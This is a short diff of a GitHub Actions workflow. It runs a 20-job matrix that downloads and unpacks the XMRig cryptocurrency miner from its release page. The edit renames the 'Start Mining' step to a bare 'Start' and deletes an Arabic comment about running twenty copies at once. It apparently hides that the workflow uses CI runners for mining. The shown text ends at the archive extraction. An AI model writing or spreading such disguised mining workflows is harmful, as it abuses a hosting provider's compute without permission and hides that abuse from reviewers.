@@ -9,12 +9,9 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # تشغيل 20 نسخة من السيرفر في آن واحد
         go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
-      - name: Preparation
-        run: sudo apt update && sudo apt install screen -y
-      - name: Start Mining
+      - name: Start
         run: |
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
           tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
